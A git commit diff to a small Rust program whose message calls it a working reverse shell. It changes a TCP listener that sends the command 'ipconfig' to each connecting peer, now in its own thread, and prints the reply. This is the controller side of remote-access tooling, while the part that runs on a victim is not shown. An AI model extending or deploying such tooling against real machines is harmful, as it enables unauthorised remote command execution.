a186517b0d7a2a7f9c21165a7114d6d391a6c198
Vitalii <vetajika@gmail.com>
2023-04-24 17:04:23 +0300

    Worked reverse shell

--- src/main.rs
+++ src/main.rs
@@ -1,14 +1,15 @@
 use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
+use std::thread;
 
 fn try_to_ip_config(mut stream: TcpStream) {
-    let command: String = String::from("/ipconfig");
-    stream.write(&command.as_bytes()).unwrap();
-    print!("Sent");
+    let command: String = String::from("ipconfig");
 
-    let mut data: Vec<u8> = vec![];
+    stream.write(&command.as_bytes()).unwrap();
+
+    let mut data = [0; 1024];
     stream.read(&mut data).unwrap();
-    print!("{}", String::from_utf8(data).unwrap());
+    println!("Got - {}", String::from_utf8(data.to_vec()).unwrap());
 }
 
 fn main() {
@@ -21,7 +22,9 @@ fn main() {
         match stream {
             Ok(stream) => {
                 println!("New connection from {}", stream.peer_addr().unwrap());
-                try_to_ip_config(stream)
+                thread::spawn(move || {
+                    try_to_ip_config(stream)
+                });
             }
             Err(e) => {
                 println!("Error {}", e)
